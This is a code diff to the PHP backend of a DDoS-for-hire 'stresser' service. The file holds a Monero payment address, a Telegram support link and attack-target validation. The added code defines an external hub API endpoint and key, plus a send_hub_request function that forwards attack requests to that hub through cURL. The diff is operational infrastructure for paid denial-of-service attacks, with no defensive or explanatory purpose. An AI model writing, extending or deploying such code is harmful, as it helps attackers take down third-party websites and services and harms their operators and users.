@@ -14,6 +14,11 @@ define('CRYPTO_XMR_ADDRESS', '888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRDZVN');
 // Telegram support link
 define('TELEGRAM_LINK', 'https://t.me/atomicstresser');
 
+// Hub API settings – set HUB_API_URL to the external stresser endpoint
+// e.g. 'http://1.1.1.1/api.php'
+define('HUB_API_URL', '');
+define('HUB_API_KEY', '');
+
 // Rate limiting settings
 define('RATE_LIMIT_MAX_ATTEMPTS', 5);
 define('RATE_LIMIT_WINDOW', 900); // 15 minutes
@@ -139,6 +144,48 @@ function validate_ipv4($ip) {
 
 function validate_url($url) {
     return filter_var($url, FILTER_VALIDATE_URL) !== false && preg_match('/^https?:\/\//', $url);
+}
+
+// =================== Hub API ===================
+
+/**
+ * Forward an attack to the configured external hub API.
+ * Returns the decoded JSON response on success, or false on failure / when
+ * HUB_API_URL is not configured.
+ */
+function send_hub_request(array $params) {
+    $base_url = rtrim(HUB_API_URL, '/');
+    if (empty($base_url)) {
+        return false; // Hub not configured
+    }
+
+    if (!empty(HUB_API_KEY)) {
+        $params['key'] = HUB_API_KEY;
+    }
+
+    $url = $base_url . '?' . http_build_query($params);
+
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL            => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT        => 10,
+        CURLOPT_FOLLOWLOCATION => false,
+        CURLOPT_SSL_VERIFYPEER => true,
+        CURLOPT_SSL_VERIFYHOST => 2,
+    ]);
+
+    $response = curl_exec($ch);
+    $err      = curl_error($ch);
+    curl_close($ch);
+
+    if ($err || $response === false) {
+        error_log("Hub API request failed: $err");
+        return false;
+    }
+
+    $decoded = json_decode($response, true);
+    return $decoded !== null ? $decoded : $response;
 }
 
 function validate_attack_target($target, $layer) {
